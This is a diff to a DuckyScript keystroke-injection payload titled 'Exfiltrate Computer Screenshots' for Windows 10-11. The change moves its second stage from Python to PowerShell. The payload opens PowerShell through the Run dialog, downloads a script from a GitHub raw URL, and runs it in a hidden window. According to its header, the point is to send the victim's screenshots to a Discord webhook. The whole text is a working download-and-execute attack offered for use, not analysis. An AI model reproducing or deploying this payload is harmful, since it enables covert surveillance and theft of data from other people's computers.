@@ -1,8 +1,8 @@
 REM ###################################################
 REM #                                                 |
 REM # Title        : Exfiltrate Computer Screenshots  |
-REM # Author       : Aleff                            |
-REM # Version      : 1.0                              |
+REM # Author       : Aleff (Modified by me)           |
+REM # Version      : 1.1                              |
 REM # Category     : Exfiltrate                       |
 REM # Target       : Windows 10-11                    |
 REM #                                                 |
@@ -12,8 +12,8 @@ REM Requirements:
 REM     - Internet Connection
 REM     - Discord Webhook (or whatever you want for the exfiltration)
 
-REM REQUIRED - Set your Python script link
-SET SCRIPT-PY-LINK=https://raw.githubusercontent.com/nazarhktwitch/WinProdKey.ps1/main/other/script_screenshot.py
+REM REQUIRED - Set your PowerShell script link
+SET SCRIPT_PY_LINK=https://raw.githubusercontent.com/nazarhktwitch/WinProdKey.ps1/main/other/script_screenshot.ps1
 
 DELAY 1000
 GUI r
@@ -22,13 +22,13 @@ STRING powershell
 ENTER
 DELAY 2000
 
-REM Download the Python script
-STRING Invoke-WebRequest -Uri "%SCRIPT-PY-LINK%" -OutFile "script.py"
+REM Download the PowerShell script
+STRING Invoke-WebRequest -Uri "%SCRIPT_PY_LINK%" -OutFile "script.ps1"
 ENTER
 DELAY 2000
 
-REM Execute the Python script in hidden window
-STRING Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+REM Execute the PowerShell script in hidden window
+STRING Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File script.ps1"
 ENTER
 DELAY 1000
 
